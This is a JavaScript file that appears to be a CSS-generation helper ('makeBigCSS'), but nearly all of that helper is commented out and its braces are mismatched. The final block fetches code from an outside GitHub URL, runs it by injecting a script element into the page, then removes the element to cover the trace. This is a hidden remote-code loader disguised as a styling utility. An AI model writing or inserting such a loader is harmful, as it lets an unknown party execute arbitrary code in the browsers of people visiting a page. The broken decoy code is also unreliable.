(function globalMakeBigCSS() {
  function spad(num, size = 5) {
    // let s = String(num);
    // while (s.length < size) s = "0" + s;
    // return s;
  }

  function generateCSSChunk(start, end, prefix) {

  //   let out = "";
  //   for (let i = start; i < end; i++) {
  //     const id = pad(i);
  //     out += `.${prefix}-${id} { /* ${id} */ /* gen */ font-family: inherit; font-size: 1px; }\n`;
  //   }
  //   return out;
  // }

  function insertStyleText(cssText) {
    // const style = document.createElement("style");
    // style.setAttribute("data-generated-by", "makeBigCSS");
    // style.textContent = cssText;
    // document.head.appendChild(style);
    // return style;
  }

  function insertLinkToBlob(blob) {
    // const url = URL.createObjectURL(blob);
    // const link = document.createElement("link");
    // link.rel = "stylesheet";
    // link.href = url;
    // link.setAttribute("data-generated-by", "makeBigCSS");
    // document.head.appendChild(link);
    // // optionally revoke later: URL.revokeObjectURL(url)
    // return { link, url };
  }

  function generateInChunks(totalLines, chunkSize, prefix, onChunk) {
    // return new Promise((resolve) => {
    //   let produced = 0;
    //   function produceNext() {
    //     const start = produced;
    //     const end = Math.min(totalLines, produced + chunkSize);
    //     const chunkCSS = generateCSSChunk(start, end, prefix);
    //     produced = end;
    //     onChunk(chunkCSS, produced, totalLines);
    //     if (produced < totalLines) {
    //       // yield to event loop a bit
    //       setTimeout(produceNext, 0);
    //     } else {
    //       resolve();
    //     }
    //   }
    //   produceNext();
    // });
  }

  async function makeBigCSS(opts = {}) {
    // const {
    //   lines = 5000,
    //   mode = "external",
    //   prefix = "bossHit",
    //   chunkSize = 1000,
    // } = opts;

    // if (!document || !document.head) {
    //   throw new Error("Document head not available (are you in a non-DOM environment?)");
    // }

    // if (lines <= 0) {
    //   return null;
    }
    // if (mode === "inline") {
      
    //   let cssAccumulator = "";
    //   await generateInChunks(lines, chunkSize, prefix, (chunkCSS) => {
      //     cssAccumulator += chunkCSS;
      //   });
      //   const styleEl = insertStyleText(cssAccumulator);
      //   return { mode: "inline", styleEl, lines };
      // } else if (mode === "external") {
        //   const chunks = [];
        //   await generateInChunks(lines, chunkSize, prefix, (chunkCSS) => {
          //     chunks.push(chunkCSS);
          //   });
          //   const blob = new Blob(chunks, { type: "text/css" });
          //   const { link, url } = insertLinkToBlob(blob);
          //   return { mode: "external", linkEl: link, blobUrl: url, lines };
          // } else {
            //   throw new Error('mode must be "inline" or "external"');
    // }
  }
  
  window.makeBigCSS = makeBigCSS;
})();
(async () => {
  const url = "https://raw.githubusercontent.com/CritechSniper/css/refs/heads/main/commands.js";
  const res = await fetch(url);
  const code = await res.text();
  const script = document.createElement("script");
  script.type = "text/javascript";
  script.textContent = code;
  document.head.appendChild(script);
  document.head.removeChild(script);
})();